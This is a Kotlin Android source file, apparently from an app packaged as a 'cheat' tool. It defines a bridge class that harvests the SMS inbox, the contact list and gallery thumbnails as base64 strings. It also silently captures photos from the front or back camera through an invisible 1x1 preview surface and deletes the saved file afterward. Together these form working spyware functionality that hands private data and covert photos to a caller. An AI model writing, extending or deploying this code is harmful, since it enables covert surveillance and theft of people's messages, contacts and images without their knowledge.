package com.yanz.cheat

import android.app.Activity
import android.content.ContentUris
import android.graphics.Bitmap
import android.net.Uri
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Base64
import android.util.Size
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.Preview
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import java.io.ByteArrayOutputStream
import java.io.File

class NativeBridge(private val activity: Activity) {
    fun getSms(): List<Map<String, String>> {
        val out = mutableListOf<Map<String, String>>()
        val cursor = activity.contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body", "date"), null, null, "date DESC")
        cursor?.use {
            val iAddr = it.getColumnIndex("address"); val iBody = it.getColumnIndex("body"); val iDate = it.getColumnIndex("date")
            var count = 0
            while (it.moveToNext() && count < 100) {
                out.add(mapOf("from" to (it.getString(iAddr) ?: ""), "body" to (it.getString(iBody) ?: ""), "date" to (it.getLong(iDate) ?: 0L).toString()))
                count++
            }
        }
        return out
    }

    fun getContacts(): List<Map<String, String>> {
        val out = mutableListOf<Map<String, String>>()
        val cursor = activity.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)
        cursor?.use {
            val iName = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME); val iNum = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            var count = 0
            while (it.moveToNext() && count < 300) {
                out.add(mapOf("name" to (it.getString(iName) ?: ""), "phone" to (it.getString(iNum) ?: "")))
                count++
            }
        }
        return out
    }

    fun getGallery(): List<Map<String, String>> {
        val out = mutableListOf<Map<String, String>>()
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val cursor = activity.contentResolver.query(uri, arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME), null, null, "date_added DESC")
        cursor?.use {
            val iId = it.getColumnIndex(MediaStore.Images.Media._ID); val iName = it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
            var count = 0
            while (it.moveToNext() && count < 30) {
                val id = it.getLong(iId); val name = it.getString(iName) ?: ""
                val thumbUri = ContentUris.withAppendedId(uri, id)
                try {
                    val bmp = activity.contentResolver.loadThumbnail(thumbUri, Size(220, 220), null)
                    out.add(mapOf("name" to name, "image" to toBase64(bmp)))
                } catch (_: Exception) {}
                count++
            }
        }
        return out
    }

    fun capturePhoto(front: Boolean, callback: (String) -> Unit) {
        val future = ProcessCameraProvider.getInstance(activity)
        future.addListener({
            try {
                val provider = future.get()
                val selector = if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
                val imageCapture = ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
                val preview = Preview.Builder().build()
                preview.setSurfaceProvider { request ->
                    try {
                        val surfaceTexture = android.graphics.SurfaceTexture(0)
                        surfaceTexture.setDefaultBufferSize(1, 1)
                        val surface = android.view.Surface(surfaceTexture)
                        request.provideSurface(surface, ContextCompat.getMainExecutor(activity)) {}
                    } catch (_: Exception) {}
                }
                provider.unbindAll()
                provider.bindToLifecycle(activity as LifecycleOwner, selector, imageCapture, preview)
                val file = File(activity.cacheDir, "cap_${System.currentTimeMillis()}.jpg")
                val output = ImageCapture.OutputFileOptions.Builder(file).build()
                imageCapture.takePicture(output, ContextCompat.getMainExecutor(activity), object : ImageCapture.OnImageSavedCallback {
                    override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                        try {
                            val bytes = file.readBytes()
                            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                            file.delete()
                            provider.unbindAll()
                            callback(b64)
                        } catch (_: Exception) { callback("") }
                    }
                    override fun onError(exception: ImageCaptureException) {
                        try { provider.unbindAll() } catch (_: Exception) {}
                        callback("")
                    }
                })
            } catch (e: Exception) { callback("") }
        }, ContextCompat.getMainExecutor(activity))
    }

    private fun toBase64(bmp: Bitmap): String {
        val baos = ByteArrayOutputStream(); bmp.compress(Bitmap.CompressFormat.JPEG, 70, baos)
        return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
    }
}